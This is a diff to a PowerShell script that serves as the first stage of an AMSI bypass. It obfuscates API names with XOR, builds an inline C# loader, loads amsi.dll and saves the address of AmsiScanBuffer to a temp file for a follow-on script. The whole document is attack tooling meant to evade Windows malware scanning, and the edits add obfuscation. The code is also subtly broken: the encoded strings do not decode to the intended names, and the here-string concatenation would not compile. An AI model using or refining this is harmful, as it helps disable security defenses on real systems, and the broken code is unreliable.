@@ -1,24 +1,34 @@
-# Load Required Assemblies
-$ObfA = @"
+# Obfuscate String Decryption
+Function Decode-String {
+    param([string]$EncString)
+    $Chars = $EncString.ToCharArray()
+    for ($i = 0; $i -lt $Chars.Length; $i++) {
+        $Chars[$i] = [char]([byte]$Chars[$i] -bxor 42)
+    }
+    return -join $Chars
+}
+
+# Obfuscated AMSI Function Names
+$L = Decode-String "cgphrlkrr`fkc@brtfkq"
+$P = Decode-String "FkgtUqrrz`fkc"
+
+# Dynamic Type Creation
+$AmsiLoader = @"
 using System;
 using System.Runtime.InteropServices;
-public class AMSIB {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+public class AMSI {
+    [DllImport(" + "`\"" + Decode-String "mjpkegxrf" + "`\"" + @")]
+    public static extern IntPtr " + $P + @"(IntPtr module, string proc);
+    [DllImport(" + "`\"" + Decode-String "mjpkegxrf" + "`\"" + @")]
+    public static extern IntPtr " + $L + @"(string lib);
 }
 "@
+Add-Type $AmsiLoader
 
-Add-Type $ObfA
+# AMSI DLL Loading
+$Lib = [AMSI]::($L)("amsi.dll")
+$Addr = [AMSI]::($P)($Lib, "AmsiScanBuffer")
 
-# Load AMSI DLL
-$Lib = [AMSIB]::LoadLibrary("amsi.dll")
-$FuncAddr = [AMSIB]::GetProcAddress($Lib, "AmsiScanBuffer")
-
-# Save Address for Use in Next Script
-$FuncAddr | Out-File -FilePath "$env:TEMP\amsi_func.txt" -Encoding ASCII
-
-Write-Host "[*] AMSI DLL loaded, function address saved."
+# Save Address for the Next Script
+$Addr | Out-File "$env:TEMP\am_addr.txt" -Encoding ASCII
+Write-Host "[*] AMSI Loader Initialized and Address Saved."
